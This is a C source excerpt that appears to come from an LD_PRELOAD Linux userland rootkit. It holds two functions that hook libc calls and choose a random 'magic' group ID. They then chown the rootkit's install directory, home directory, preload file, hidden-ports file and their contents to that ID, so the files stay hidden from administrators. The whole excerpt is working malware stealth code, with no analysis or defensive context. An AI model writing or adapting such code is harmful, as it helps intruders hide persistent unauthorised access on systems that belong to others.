void hidedircontents(const char *path, gid_t newgid){
    hook(COPENDIR, CREADDIR);

    DIR *dp = call(COPENDIR, path);
    if(dp == NULL) return;

    struct dirent *dir;
    while((dir = call(CREADDIR, dp)) != NULL){
        if(!strcmp(".\0", dir->d_name) || !strcmp("..\0", dir->d_name))
            continue;

        char tmp[strlen(path) + strlen(dir->d_name) + 3];
        snprintf(tmp, sizeof(tmp), "%s/%s", path, dir->d_name);
        chown_path(tmp, newgid);
    }
    closedir(dp);
}

gid_t changerkgid(void){
    hook(CFOPEN, CSETGID, CFWRITE);
    srand(time(NULL));

    FILE *fp;
    gid_t oldgid, newgid;
    int x = 3, i;
    char buf[12];

    fp = call(CFOPEN, GID_PATH, "w");
    if(fp == NULL)
        return -1;

    oldgid = getgid();
    newgid = rand() >> x;
    while((long)call(CSETGID, newgid) < 0)
        newgid = rand() >> x++;
    call(CSETGID, oldgid);

    snprintf(buf, sizeof(buf), "%d", newgid);
    call(CFWRITE, buf, 1, strlen(buf), fp);
    fclose(fp);

    // these are 3 paths that will always exist regardless.
    char *bdvpaths[3] = {INSTALL_DIR, HOMEDIR, PRELOAD_FILE};
    for(i = 0; i != sizeofarr(bdvpaths); i++)
        chown_path(bdvpaths[i], newgid);

    for(i = 0; i != TOGPATHS_SIZE; i++)
        chown_path(togpaths[i], newgid);

#ifdef HIDE_PORTS
    chown_path(HIDEPORTS, newgid);
#endif

    hidedircontents(INSTALL_DIR, newgid);
    hidedircontents(HOMEDIR, newgid);
#ifdef HIDE_MY_ASS
    hidemyass();
#endif

    return newgid;
}